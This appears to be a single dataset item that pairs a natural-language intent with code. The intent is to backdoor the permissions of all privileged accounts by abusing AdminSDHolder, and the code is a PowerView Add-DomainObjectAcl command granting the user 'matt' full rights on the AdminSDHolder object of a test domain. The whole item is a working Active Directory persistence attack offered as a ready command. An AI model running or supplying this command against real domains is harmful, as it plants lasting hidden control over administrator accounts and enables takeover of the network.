# Natural language intent:
# ackdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse

Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
